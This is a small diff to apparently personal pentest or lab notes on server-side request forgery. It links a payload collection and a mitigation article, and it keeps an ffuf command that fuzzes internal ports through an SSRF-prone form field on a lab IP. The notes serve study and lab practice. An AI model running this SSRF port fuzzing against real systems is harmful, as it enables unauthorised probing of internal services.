@@ -1,4 +1,7 @@
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
+
+Good research:
+https://blog.includesecurity.com/2023/03/mitigating-ssrf-in-2023/
 ##### Fuzz to check open ports:
 ```bash
 ffuf -w ports.txt -u http://10.129.82.103/index.php -X POST -d "dateserver=http://localhost:FUZZ&date=2024-01-01"  -H "Content-Type: application/x-www-form-urlencoded"  -fr 'Failed'
